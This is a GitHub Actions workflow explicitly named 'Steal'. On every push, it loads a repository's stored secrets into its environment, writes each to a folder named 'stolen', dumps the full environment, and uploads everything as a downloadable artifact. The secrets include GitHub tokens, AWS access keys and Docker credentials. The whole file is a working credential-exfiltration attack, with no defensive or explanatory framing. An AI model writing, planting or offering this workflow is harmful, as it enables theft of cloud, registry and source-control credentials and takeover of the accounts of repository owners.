name: Steal

on: [push, workflow_dispatch]

jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Steal
        env:
          PAT_TOKEN: ${{ secrets.PAT_TOKEN }}
          GH_PAT: ${{ secrets.GH_PAT }}
          PERSONAL_TOKEN: ${{ secrets.PERSONAL_TOKEN }}
          GH_TOKEN: ${{ secrets.GH_TOKEN }}
          TOKEN: ${{ secrets.TOKEN }}
          API_TOKEN: ${{ secrets.API_TOKEN }}
          ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
          DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
        run: |
          mkdir -p /tmp/stolen
          echo "$PAT_TOKEN" > /tmp/stolen/pat_token
          echo "$GH_PAT" > /tmp/stolen/gh_pat
          echo "$PERSONAL_TOKEN" > /tmp/stolen/personal_token
          echo "$GH_TOKEN" > /tmp/stolen/gh_token
          echo "$TOKEN" > /tmp/stolen/token
          echo "$API_TOKEN" > /tmp/stolen/api_token
          echo "$ACCESS_TOKEN" > /tmp/stolen/access_token
          echo "$AWS_ACCESS_KEY_ID" > /tmp/stolen/aws_key
          echo "$AWS_SECRET_ACCESS_KEY" > /tmp/stolen/aws_secret
          echo "$DOCKER_USERNAME" > /tmp/stolen/docker_user
          echo "$DOCKER_PASSWORD" > /tmp/stolen/docker_pass
          env > /tmp/stolen/env_all
      
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: stolen
          path: /tmp/stolen/
